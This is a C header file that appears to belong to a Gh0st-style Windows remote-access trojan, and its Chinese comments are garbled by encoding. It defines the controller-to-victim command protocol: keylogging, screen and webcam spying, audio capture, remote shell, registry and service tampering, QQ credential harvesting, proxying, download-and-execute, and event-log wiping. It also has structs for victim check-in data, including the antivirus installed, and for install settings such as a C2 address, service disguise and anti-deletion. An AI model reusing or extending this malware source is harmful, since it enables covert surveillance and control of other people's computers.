#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#include <winsock2.h>
//////////////////////////////////////////////////////////////////////////

//�ļ�����
enum
{
	// �ļ����䷽ʽ
	    TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
		TRANSFER_MODE_ADDITION,			// ׷��
		TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
		TRANSFER_MODE_OVERWRITE,		// ����
		TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
		TRANSFER_MODE_JUMP,				// ����
		TRANSFER_MODE_JUMP_ALL,			// ȫ������
		TRANSFER_MODE_CANCEL			// ȡ������
};

enum
{
    	COMMAND_LIST_FILES = 1,			// �г�Ŀ¼�е��ļ�
		COMMAND_DOWN_FILES,				// �����ļ�
		COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
		COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
		COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
		COMMAND_CONTINUE,				// �������������������������
		COMMAND_STOP,					// ������ֹ
		COMMAND_DELETE_FILE,			// ɾ���ļ�
		COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
		COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
		COMMAND_CREATE_FOLDER,			// �����ļ���
		COMMAND_RENAME_FILE,			// �ļ����ļ�����
		COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
		COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
		
		TOKEN_FILE_LIST,				// �ļ��б�
		TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
		TOKEN_FILE_DATA,				// �ļ�����
		TOKEN_TRANSFER_FINISH,			// �������
		TOKEN_DELETE_FINISH,			// ɾ�����
		TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
		TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
		TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
		TOKEN_DATA_CONTINUE,			// ������������
		TOKEN_RENAME_FINISH,			// �����������
		TOKEN_COMPRESS_FINISH,			// ѹ�����ѹ���
		TOKEN_EXCEPTION,				// ���������쳣
};

//��Ļ����
enum
{
	COMMAND_AERO_DISABLE,			// ��������ϳ�(Aero)
	COMMAND_AERO_ENABLE,			// ��������ϳ�(Aero)
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����


		
		
		TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
		TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
		TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������	
};

//���̼�¼
enum
{
		COMMAND_KEYBOARD_OFFLINE = 1,	// �������߼��̼�¼
		COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����
		TOKEN_KEYBOARD_DATA,			// ���̼�¼������
};

//��Ƶ�鿴
enum
{
		COMMAND_WEBCAM_RESIZE = 1,    		// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
		TOKEN_WEBCAM_DIB,			    	// ����ͷ��ͼ������
};

//��������
enum
{
		COMMAND_AUDIO_DATE = 1,         // ���ͱ�����������
		COMMAND_AUDIO_CHANGER,          // ���������豸
		COMMAND_AUDIO_CHANGER_LINES,    // ������������
		
		TOKEN_AUDIO_DATA,               // ��Ƶ����
		TOKEN_AUDIO_CHANGE_FINISH,      // �����ɹ�
};

//ϵͳ��Ϣ
enum
{
	TOKEN_CPUMEMORY
};
	

//ϵͳ����
enum
{
		COMMAND_PSLIST = 1,				// �����б�
		COMMAND_WSLIST,					// �����б�
		COMMAND_DSLIST,					// ��������
		COMMAND_SOFTWARELIST,           // ����б�
		COMMAND_HOSTS,					// HOSTS�ļ�
		COMMAND_HARDWARE,				// Ӳ����Ϣ 

		//////////////
		COMMAND_KILLPROCESS,			// �رս���
		COMMAND_KILLPROCESS_WINDOW,     // �رս���(����)
		COMMAND_FREEZING,				// �������
		COMMAND_THAW,					// �ⶳ����
		COMMAND_FILEATTR,				// �ļ�����
		COMMAND_WINDOW_TEST,            // �������ء���ԭ����󻯡���С��
		COMMAND_WINDOW_CLOSE,           // ���ڹر�
		COMMAND_APPUNINSTALL,			// ж�س���
		//
		TOKEN_WSLIST,					// �����б�
		TOKEN_DIALUPASS,				// ��������
		TOKEN_SOFTWARE,					// �����Ϣ
		TOKEN_HOSTS,					// HOSTS��
		TOKEN_HARDWARE,					// Ӳ����Ϣ
		///////////////////////
		TOKEN_FILEATTR,					// �ļ�����

};	

//�������
enum
{
		COMMAND_DELETESERVERICE = 100,       // ɾ������
		COMMAND_STARTSERVERICE,              // ��������
		COMMAND_STOPSERVERICE,               // ֹͣ����
		COMMAND_PAUSESERVERICE,              // ��ͣ����
		COMMAND_CONTINUESERVERICE,           // ��������
};

//ע������	
enum
{
		COMMAND_REG_ENUM = 1,             // ö��ע���
		COMMAND_REG_CREATEKEY,            // ����·��
		COMMAND_REG_DELKEY,               // ɾ��·��
		COMMAND_REG_CREATKEY,             // ������
		COMMAND_REG_DELVAL,               // ɾ����
		
		TOKEN_REG_INFO,                   // ע�����Ϣ
		TOKEN_REG_SUCCEED,                // ע���ɹ�
		TOKEN_REG_ERROR,                  // ע������
		TOKEN_REG_KEY,                    // ��ֵ����
};

//������Ϣ
enum
{
		COMMAND_QQDATA = 1,	
		TOKEN_QQDATA,					
};

//////////////////////////////////////////////////////////////////////////
enum
{
		COMMAND_PROXY_CONNECT= 1, //socket5����
		COMMAND_PROXY_CLOSE,
		COMMAND_PROXY_DATA,
		
		TOKEN_PROXY_CONNECT_RESULT,
		TOKEN_PROXY_CLOSE,
		TOKEN_PROXY_DATA,
		TOKEN_PROXY_BIND_RESULT
};

enum
{
	// ���ƶ˷���������
	COMMAND_NEXT = 100,				// ��һ��(���ƶ��Ѿ��򿪶Ի���)
	COMMAND_SESSION = 0,			// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_UNINSTALL,              // ж��
	COMMAND_DOWN_EXEC,              // ����ִ��
	COMMAND_DOWN_UPDATE,            // ���ظ���
	COMMAND_OPEN_URL_SHOW,          // ����ҳ����ʾ��
	COMMAND_OPEN_URL_HIDE,          // ����ҳ�����أ�
	COMMAND_CLEAN_EVENT,            // ������־
	COMMAND_RENAME_REMARK,          // ���ı�ע
	COMMAND_CHANGE_GROUP,           // ���ķ���
	COMMAND_SHOW_MSG,				// ��Ϣ����

	COMMAND_OPEN_PROXY,             // ��������
	COMMAND_CLOSE_PROXY,            // �رմ���
	COMMAND_START,					//д������


	// ���ƶ˷�����������
	COMMAND_LIST_DRIVE,				//  �ļ�����
	COMMAND_SCREEN_SPY,				//  ��Ļ����
	COMMAND_KEYBOARD,				//  ���̼�¼
	COMMAND_WEBCAM,					//  ��Ƶ�鿴
	COMMAND_AUDIO,					//  ��������
	COMMAND_SHELL,					//  Զ���ն�
	COMMAND_SYSTEMINFO,				//  ϵͳ��Ϣ
	COMMAND_SYSTEM,					//  ϵͳ����
	COMMAND_SERVICE,				//  �������
	COMMAND_REGEDIT,                //  ע �� ��
	COMMAND_TEXT_CHAT,				//  Զ������
	COMMAND_QQINFO,					//  ������Ϣ
	COMMAND_PROXY_MAP,				//  ����ӳ��

	


	
/////////////////////////////////////////////////////////////////////////////////////////

	// ����˷����ı�ʶ
	TOKEN_LOGIN = 200,				// ���߰�
	TOKEN_DRIVE_LIST,				// �ļ�����
	TOKEN_BITMAPINFO,				// ��Ļ����
	TOKEN_KEYBOARD_START,			// ���̼�¼
	TOKEN_WEBCAM_BITMAPINFO,		// ��Ƶ�鿴
	TOKEN_AUDIO_START,				// ��������
	TOKEN_SHELL_START,				// Զ���ն�
	TOKEN_SYSTEMINFO,				// ϵͳ��Ϣ
	TOKEN_PSLIST,					// ϵͳ����
	TOKEN_SERVICE_LIST,             // �����б�
	TOKEN_REGEDIT,					// ע���
	TOKEN_TEXTCHAT_START,           // Զ������
	TOKEN_QQINFO,					// ������Ϣ
	TOKEN_PROXY_START,              // ����ӳ��
};

//������־
enum
{
		CLEAN_EVENT_ALL = 1,
		CLEAN_EVENT_SYS,
		CLEAN_EVENT_SEC,
		CLEAN_EVENT_APP
};

//////////���߽ṹ��
typedef struct
{	
	BYTE			bToken;			// = 1
	char			UpGroup[32];	// ���߷���
	IN_ADDR	    	IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	DWORD			dwCPUClockMhz;	// CPUƵ��
	int				nCPUNumber;		// CPU����
	DWORD			MemSize;		// �ڴ��С
	DWORD           FreeMemSize;	// �����ڴ�
	DWORD			DriverSize;		// Ӳ������
	DWORD			FreeDriverSize;	// �ڴ�Ӳ��
	BOOL			bIsActive;	    // �û�״̬
 	DWORD			dwSpeed;		// ����
	char			nQQ[100];		//��ǰQQ
	DWORD			Speed;		    // ����
	bool			bIsWebCam;		// �Ƿ�������ͷ
	char            Virus[50];		// ɱ�����
	char			szVersion[32];	// ���߰汾
	char			BuildTime[50];	// ����ʱ��
}LOGININFO;

///////��װ��Ϣ�ṹ��
struct ONLINE_DATA
{
	char LoginAddr[100];    //���ߵ�ַ
	DWORD LoginPort;		//���߶˿�
	char UpGroup[32];       //���߷���
	char Version[32];		//���߰汾
	CHAR ServiceName[100];   //��������
	CHAR ServicePlay[128];   //������ʾ
	CHAR ServiceDesc[256];   //��������
	CHAR FolderName[256];	 //Ŀ¼����
	CHAR ProcessName[128];   //��������
	CHAR Install;            //��������
	CHAR Mutex[100];		//���л���
	CHAR Buildtime[100];	//����ʱ��
	CHAR szDownRun[300];     //�����ַ
	BOOL Antideletion;       //��ɾ��
	BOOL Selfdeletion;		//��ɾ��

};
#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 8 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 8 // ���������ݳ���

#endif // !defined(AFX_MACROS_H_INCLUDED)